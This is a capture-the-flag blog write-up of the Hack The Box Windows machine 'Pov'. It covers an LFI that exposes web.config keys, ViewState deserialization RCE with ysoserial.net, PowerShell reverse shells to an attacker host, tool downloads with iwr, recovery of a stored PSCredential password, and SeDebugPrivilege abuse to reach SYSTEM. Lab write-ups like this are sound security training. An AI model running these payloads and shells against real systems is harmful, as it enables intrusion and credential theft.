---
layout: posts
title: "HTB — Pov Writeup"
date: 2026-02-01
tags: [htb, writeup, windows, web]
categories: [ctf]
---

## Overview

- **Machine:** Pov
- **Platform:** Hack The Box
- **OS:** Windows
- **Difficulty:** Medium

Pov is a medium-difficulty machine that serves as an excellent introduction to deserialization vulnerabilities. The initial foothold is straightforward, while still teaching us an interesting and important concept that's been going around for years. From a privilege-escalation perspective, it reinforces why keeping credentials secure is critical.

---

## Initial Enumeration

### Nmap scan

```bash
┌──(kali㉿kali)-[~/hackthebox/pov]
└─$ sudo nmap -p- -sVC 10.129.41.38

Nmap scan report for 10.129.41.38
Host is up (0.030s latency).
Not shown: 65534 filtered tcp ports (no-response)

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: pov.htb

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The initial scan shows only one port open and I ran an udp scan after seeing only one port open. It didn't show anything interesting.

### Port 80

<p align="center">
  <a href="/assets/images/pov/Captura.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura.PNG" width="700">
  </a>
</p>

The website is running on Microsoft IIS 10.0, as shown by the Nmap scan. Clicking around the page doesn’t really lead anywhere, since all the buttons seem to be non-functional. There’s also a contact form at the bottom, but it doesn’t appear to do anything either, submitting it doesn’t even trigger a request. I'll run a dirbuster scan in the meanwhile.

<p align="center">
  <a href="/assets/images/pov/Captura2.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura2.PNG" width="700">
  </a>
</p>

Dirbuster doesn’t show anything out of the ordinary, just the standard directories used by the site.

```bash
┌──(kali㉿kali)-[~/hackthebox/pov]
└─$ dirb http://10.129.41.38

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb  3 13:14:04 2026
URL_BASE: http://10.129.41.38/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.129.41.38/ ----
==> DIRECTORY: http://10.129.41.38/css/                                                                                                                                                                                                    
==> DIRECTORY: http://10.129.41.38/img/                                                                                                                                                                                                    
+ http://10.129.41.38/index.html (CODE:200|SIZE:12330)                                                                                                                                                                                     
==> DIRECTORY: http://10.129.41.38/js/                                                                                                                                                                                                     
                                                                                                                                                                                                                                           
---- Entering directory: http://10.129.41.38/css/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://10.129.41.38/img/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://10.129.41.38/js/ ----
                                                                                                                                                                                                                                           
-----------------
END_TIME: Tue Feb  3 13:27:18 2026
DOWNLOADED: 18448 - FOUND: 1
```

Something that did caught my attention was the email provided in the contact us section, `sfitz@pov.htv`. Whenever I see a non-standard email domain, it usually hints at an additional virtual host or application logic tied to that hostname. I'll add the domain to my /etc/hosts, and take note of the username.

<p align="center">
  <a href="/assets/images/pov/Captura3.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura3.PNG" width="700">
  </a>
</p>

Now that we have a domain, we can start fuzzing for additional virtual hosts. I'll use ffuf for this task, as it is quicker to fine-tune and to scan.

```bash
┌──(kali㉿kali)-[~/hackthebox/pov]
└─$ ffuf -u http://pov.htb -H "Host: FUZZ.pov.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 12330

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pov.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.pov.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 12330
________________________________________________

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 31ms]
```

After a couple of seconds, something pops up. I'll add this to my /etc/hosts and start exploring it.

### dev.pov.htb

<p align="center">
  <a href="/assets/images/pov/Captura4.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura4.PNG" width="700">
  </a>
</p>

It seems like the portfolio for our previously anotated user `sfitz`. This time, we do have a button with functionality: `Download CV` will download a PDF containing the resume of sftiz. In this case, I’ll run a feroxbuster scan, since this virtual host seems more promising. As the server is running Microsoft IIS, I’ll include the .aspx extension.

<p align="center">
  <a href="/assets/images/pov/Captura5.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura5.PNG" width="700">
  </a>
</p>

<p align="center">
  <a href="/assets/images/pov/Captura6.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura6.PNG" width="700">
  </a>
</p>

Feroxbuster shows two .aspx pages, `"default"` and `"contact"`.

```bash
┌──(kali㉿kali)-[~/hackthebox/pov]
└─$ feroxbuster -u http://dev.pov.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -q -C 404 -r -x aspx

404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      423l     1217w    21371c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      106l      271w     4691c http://dev.pov.htb/portfolio/Contact.aspx
200      GET       32l       73w      782c http://dev.pov.htb/portfolio/assets/js/steller.js
200      GET     1081l     1807w    16450c http://dev.pov.htb/portfolio/assets/vendors/themify-icons/css/themify-icons.css
200      GET    11646l    23442w   242029c http://dev.pov.htb/portfolio/assets/css/steller.css
200      GET     7013l    22369w   222911c http://dev.pov.htb/portfolio/assets/vendors/bootstrap/bootstrap.bundle.js
200      GET    10598l    42768w   280364c http://dev.pov.htb/portfolio/assets/vendors/jquery/jquery-3.4.1.js
200      GET        0l        0w    21371c http://dev.pov.htb/portfolio/default.aspx
200      GET      106l      271w     4691c http://dev.pov.htb/portfolio/contact.aspx
Scanning: http://dev.pov.htb/
Scanning: http://dev.pov.htb/portfolio/
```

<p align="center">
  <a href="/assets/images/pov/Captura9.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura9.PNG" width="700">
  </a>
</p>

default.aspx is just the main index page, and contact.aspx shows a contact form that I never really got to tinker with. Digging any deeper didn’t reveal anything new.

That said, inspecting the page’s source code revealed something much more interesting.

<p align="center">
  <a href="/assets/images/pov/Captura7.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura7.PNG" width="700">
  </a>
</p>

### Shell as sfitz

The Download CV link triggers the JavaScript function __doPostBack('download', ''). What really stands out here are the __VIEWSTATEGENERATOR and __EVENTVALIDATION fields involved in the request. A quick search shows that these are part of the ASP.NET WebForms framework, confirming that the application is running on WebForms.

While trying to capture the download with Burp Suite, no POST request was showing up, which made traffic analysis a bit tricky. Because of that, I decided to rely exclusively on Burp’s intercept mode moving forward.

### Initial foothold

Reviewing the traffic from BurpSuite, we can see the already mentioned ASP.NET WebForms headers.

<p align="center">
  <a href="/assets/images/pov/Captura8.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura8.PNG" width="700">
  </a>
</p>

To understand the plan ahead, I'll explain what is ASP.NET WebForms and how does it handle states, as well as what these state-related fields mean and do.

ASP.NET Web Forms is an older ASP.NET framework that handles user interactions using server-side events rather than direct, clearly defined HTTP endpoints. It keeps track of page state through mechanisms such as ViewState and EventValidation, which are exchanged between the client and the server on each interaction.

As a visual learner myself, I find it easier to understand this behavior by looking at the flow rather than just reading about it. The chart below represents how information and state are passed back and forth between the client and the server in an ASP.NET Web Forms application.

<p align="center">
  <a href="/assets/images/pov/Captura10.png" class="glightbox">
    <img src="/assets/images/pov/Captura10.png" width="700">
  </a>
</p>

From an attack point of view, anything the client can influence and that later gets processed by the server is always worth looking at. In this case, the state-related fields used by Web Forms stand out, since they play a direct role in how the server decides what logic to execute.

It’s also worth keeping in mind that actions in ASP.NET Web Forms don’t generate the kind of clean, obvious POST requests you might expect. Instead, everything is handled through generic postbacks to the same page, with the server figuring out what to do based on the submitted state data.

First of all, the most obvious would be the "`file`" paremeter, I'll test for LFI. For Windows, my go to file is win.ini, sitting in C:/Windows/win.ini. Using common bypasses such as //....// won't work either, so I'll try for something that is sitting on the same directory.

<p align="center">
  <a href="/assets/images/pov/Captura11.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura11.PNG" width="700">
  </a>
</p>

<p align="center">
  <a href="/assets/images/pov/Captura12.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura12.PNG" width="700">
  </a>
</p>

Default.aspx gives us results. I couldn't get it work with outside files till I tried absolute paths with backward slashes.

<p align="center">
  <a href="/assets/images/pov/Captura13.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura13.PNG" width="700">
  </a>
</p>

### LFI

With a working LFI, I'll always look into interesting files, such as databases or configuration files. For ASP.NET, the configuration file is named web.config and it usually sits in the root directory of the application. We can try to go up one directory till we hit web.config.

<p align="center">
  <a href="/assets/images/pov/Captura14.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura14.PNG" width="700">
  </a>
</p>

<p align="center">
  <a href="/assets/images/pov/Captura15.PNG" class="glightbox">
    <img src="/assets/images/pov/Captura15.PNG" width="700">
  </a>
</p>

### RCE

A quick search on google would tell us what machineKeys is and what is it used for in the ASP.NET environment. A little bit deeper research leads to this [post](https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet) which talks about deserialization from 2019.

Following this post and the official repo, we can get a good idea on how to craft our payload with [ysoserial.net](https://github.com/frohoff/ysoserial). For agility purposes, we'll run the .exe in linux with wine. The flags we want are the following:

- `-p ViewState` to set the ViewState plugin
- `-g WindowsIdentity`, this is the gadget to use, usually discovered by trial and error. Many will work here.
- `--da="AES"`, the decryption algorithm, provided in the web.config.
- `--dk="74477.....3"`, decryption key from the web.config.
- `--va="SHA1"`, validation algorithm provided in the web.config.
- `--vk="56......68"`, validation key from the web.config.
- `--path="/portfolio"`, also included in the web.config.
- `-c "ping 10.10.14.nopeek"`, the command to run, for a test I'll run a simple ping.

```bash
wine ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio" -c "ping 10.10.14.nopeek"

sTU3OeD...E2hSeV4h2A%3D%3Dk
```

The generated payload is base64 encoded. We'll now pass it to the server through the `VIEWSTATE` parameter.

```bash
┌──(kali㉿kali)-[~/hackthebox/pov/Release]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:08:42.329343 IP dev.pov.htb > 10.10.14.X: ICMP echo request, id 1, seq 1, length 40
12:08:42.330125 IP 10.10.14.X > dev.pov.htb: ICMP echo reply, id 1, seq 1, length 40
```

The desarialization works and we have achieved a succesful RCE. Now, we have to craft another payload that gives us a shell. For this case, I used the base64 powershell reverse shell.

```bash
┌──(kali㉿kali)-[~/hackthebox/pov/Release]
└─$ wine ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio" -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGs...B0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

kUOomfyVqqPXAG0tQAw9JYSQsSsVfxFMuU9Dsb38ellpx...
```

After a couple of minutes I receive a connection.

```bash
┌──(kali㉿kali)-[~/hackthebox/pov/Release]
└─$ nc -lvnp 9001                                                       
listening on [any] 9001 ...
connect to [10.10.14.X] from (UNKNOWN) [10.129.70.227] 49671

PS C:\windows\system32\inetsrv> whoami
pov\sfitz
```

### Shell as alaading

sfitz doesn't have the flag and after taking a look at the machine, we can see there's another user named alaading, which would be the next target. I spent a couple of minutes manually reviewing the machine for something interesting.

I found a .xml file inside the `documents` folder in sfitz home.

```bash
PS C:\Users\sfitz> cd Documents
PS C:\Users\sfitz\Documents> ls


    Directory: C:\Users\sfitz\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       12/25/2023   2:26 PM           1838 connection.xml                                                        

```

```bash
PS C:\Users\sfitz\Documents> cat connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

This looks like a configuration file with an encrypted password inside. Upon searching on google, I hit this [web](https://stackoverflow.com/questions/63639876/powershell-password-decrypt) first which leds me to the function `"Import-Clixml"`. Looking around for a way to decrypt the password using this function, I found this [post](https://www.reddit.com/r/PowerShell/comments/rwy921/powershell_encrypting_and_decrypting_a_password/) on reddit which pretty much answers my question.

Following the post, these are the commands.

```bash
PS C:\Users\sfitz\Documents> $cred = Import-Clixml -Path 'C:\\Users\\sfitz\\Documents\\connection.xml'
PS C:\Users\sfitz\Documents> $cred.getnetworkcredential().password      
f8gQ8fynP44ek1m3
````

Just to note that in the reddit post it says `"$cred.getnetworkcredential.password"`, this will be just a reference to the method and it will not be executed. To receive output and actually execute the method we need to add the parentheses.

Moving on, we have a plaintext password for the user alaading however, we don't have WinRM or anywhere to use it directly, so we'll rely on [RunasCS](https://github.com/antonioCoco/RunasCs), which allows to execute commands as another user with our current shell as long as we have the correct credentials.

### Shell as alaading

```bash
PS C:\Users\sfitz\Desktop> iwr -uri http://10.10.14.X/RunasCs.exe -o RunasCs.exe
PS C:\Users\sfitz\Desktop> .\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.X:9001

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-d6af7$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1964 created in background.
PS C:\Users\sfitz\Desktop> 
```
After a couple of seconds I receive a shell.

```bash
┌──(kali㉿kali)-[~/hackthebox/pov/Release]
└─$ nc -lvnp 9001                                                       
listening on [any] 9001 ...
connect to [10.10.14.X] from (UNKNOWN) [10.129.70.227] 49673
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
pov\alaading

C:\Windows\system32>
```

Our user.txt is also there.

```bash
PS C:\Users\alaading\Desktop> ls
ls


    Directory: C:\Users\alaading\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---         2/5/2026   8:35 AM             34 user.txt                                                              


PS C:\Users\alaading\Desktop> cat user.txt
cat user.txt
0a2...
PS C:\Users\alaading\Desktop> 
```

### Shell as administrator

A quick enumeration on our privileges with alaading reveals our next step.

```bash
PS C:\Users\alaading\Desktop> whoami /all
whoami /all

USER INFORMATION
----------------

User Name    SID                                          
============ =============================================
pov\alaading S-1-5-21-2506154456-4081221362-271687478-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE             Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Users\alaading\Desktop> 
```

We have `"SeDebugPrivilege"` enabled, which allows us to interact with and manipulate other processes on the system. If we target a process running as SYSTEM, we can abuse this privilege to inject code or dump sensitive memory, effectively inheriting SYSTEM-level privileges and achieving command execution as SYSTEM.

To achieve this, I will be using [psgetsystem](https://github.com/decoder-it/psgetsystem).

First of all, we need to get the list of the current processes that are currently running on the system. We can discover them with the command `tasklist`.

```bash
PS C:\Users\alaading\Desktop> tasklist
tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
...
winlogon.exe                   552 Console                    1     16,404 K
...
```

We have to pick a process that is running as System and will not harm the machine if manipulated. Winlogon.exe should be fine for this task. I'll note the PID of the process and into the next step.

Now we transfer psgetsystem and import it.

```bash
PS C:\Users\alaading\Desktop> iwr -uri http://10.10.14.X/psgetsys.ps1 -o psgetsys.ps1
iwr -uri http://10.10.14.x/psgetsys.ps1 -o psgetsys.ps1
PS C:\Users\alaading\Desktop> . .\psgetsys.ps1
. .\psgetsys.ps1
```
The syntax would be `"ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>"`

```powershell
PS C:\Users\alaading\Desktop> ImpersonateFromParentPid -ppid 552 -command "C:\Windows\System32\cmd.exe" -cmdargs "powershell -e JABjAGwAaQ....."
ImpersonateFromParentPid -ppid 552 -command "C:\Windows\System32\cmd.exe" -cmdargs "powershell -e JABj....."
[+] Got Handle for ppid: 552
[+] Updated proc attribute list
[+] Starting C:\Windows\System32\cmd.exe powershell -e JABjAGwAA...True - pid: 180 - Last error: 122
```

The command fails with error 122 (ERROR_INSUFFICIENT_BUFFER), meaning the operation needs more memory. This is a known issue in this situation, and the common workaround is to pivot through a WinRM session using chisel, which I’ll do next.

```bash
──(kali㉿kali)-[~/hackthebox/pov]
└─$ ./chisel_1.10.1_linux_amd64 server -p 9999 -reverse
2026/02/05 13:55:14 server: Reverse tunnelling enabled
2026/02/05 13:55:14 server: Fingerprint Dqgzjd2FkTAbiV+cJuNSqNHS7eV8C9xwrk6fmTNsIbU=
2026/02/05 13:55:14 server: Listening on http://0.0.0.0:9999
2026/02/05 13:55:35 server: session#1: tun: proxy#R:5985=>5985: Listening
```

```powershell
PS C:\Users\alaading\Desktop> iwr -uri http://10.10.14.X/chisel_1.10.1_windows_amd64 -o chisel_1.10.1_windows_amd64.exe
iwr -uri http://10.10.14.X/chisel_1.10.1_windows_amd64 -o chisel_1.10.1_windows_amd64.exe
PS C:\Users\alaading\Desktop> ./chisel_1.10.1_windows_amd64.exe client 10.10.14.X:9999 R:5985:127.0.0.1:5985
./chisel_1.10.1_windows_amd64.exe client 10.10.14.X:9999 R:5985:127.0.0.1:5985
2026/02/05 10:55:34 client: Connecting to ws://10.10.14.X:9999
2026/02/05 10:55:35 client: Connected (Latency 230.121ms)
```

Now we connect locally to WinRM.

```bash
┌──(kali㉿kali)-[~/hackthebox/pov/Release]
└─$ evil-winrm -i 127.0.0.1  -u alaading -p 'f8gQ8fynP44ek1m3'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\alaading\Documents> 
```

And we try again.

```bash
*Evil-WinRM* PS C:\Users\alaading\Desktop> ImpersonateFromParentPid -ppid 552 -command "C:\Windows\System32\cmd.exe" -cmdargs "powershell -e JABjAGw....."
```

We immediately get a shell as system.

```bash
┌──(kali㉿kali)-[~/hackthebox/pov/Release]
└─$ nc -lvnp 9001                                                       
listening on [any] 9001 ...
connect to [10.10.14.X] from (UNKNOWN) [10.129.70.227] 49673
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```
